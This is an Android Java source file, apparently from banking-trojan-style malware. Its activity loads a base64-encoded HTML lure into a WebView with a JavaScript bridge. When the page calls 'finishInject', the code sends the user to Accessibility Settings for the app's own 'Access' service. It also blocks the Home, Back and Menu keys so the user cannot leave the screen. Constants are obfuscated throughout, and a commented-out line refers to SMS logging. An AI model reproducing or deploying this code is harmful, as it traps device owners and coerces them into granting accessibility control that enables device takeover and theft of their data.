package com.service.app.Main;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Bundle;
import android.app.Activity;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.service.app.R;
import com.service.app.Services.Access;
import com.service.app.Services.utils;
import com.service.app.defines;

public class AccessActivity extends Activity {

    utils utl = new utils();
    defines consts = new defines();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //   setContentView(R.layout.activity_alert_accessbility);
        utl.SettingsWrite(getApplicationContext(),consts.activityAccessibilityVisible,consts.str_null);
        WebView wv = new WebView(this);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        wv.setWebViewClient(new AccessActivity.MyWebViewClient());
        wv.setWebChromeClient(new AccessActivity.MyWebChromeClient());
        wv.addJavascriptInterface(new WebAppInterface(this), consts.string_1);
        String base64 = getString(R.string.access);

        try {
            byte[] data = Base64.decode(base64, Base64.DEFAULT);
            base64 = new String(data, consts.strUTF_8);

            //wv.loadData(base64, consts.string_2, consts.strUTF_8);
            wv.loadDataWithBaseURL(null, base64, consts.string_2, consts.strUTF_8, null);
            setContentView(wv);
        }catch (Exception ex){
            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_145 + ex.toString() + consts.string_119);
        }


    }

    public String getServiceLabel() {
        ComponentName componentName = new ComponentName(this, Access.class);
        PackageManager packageManager = getPackageManager();
        try {
            ServiceInfo serviceInfo = packageManager.getServiceInfo(componentName, PackageManager.GET_META_DATA);
            if (serviceInfo != null) {
                return serviceInfo.loadLabel(packageManager).toString();
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }


    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }
        @JavascriptInterface
        public void finishInject() {
            Context mmContext=getApplicationContext();
            if (!utl.isAccessibilityServiceEnabled(mmContext, Access.class)){
                utl.SettingsWrite(getApplicationContext(),consts.activityAccessibilityVisible,consts.str_1);
                ComponentName componentName = new ComponentName(getApplicationContext(), Access.class);
                String serviceComponent = componentName.flattenToString();
                String settingsAction = "android.settings.ACCESSIBILITY_SETTINGS";
                Intent intent = new Intent(settingsAction);
                intent.putExtra(":settings:fragment_args_key", serviceComponent);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                startActivity(intent);
            }
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished (WebView view, String url){
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }
    }

    private class MyWebChromeClient extends WebChromeClient {

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
            return true;
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
    }
    @Override
    public void onDestroy(){
        super.onDestroy();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
}

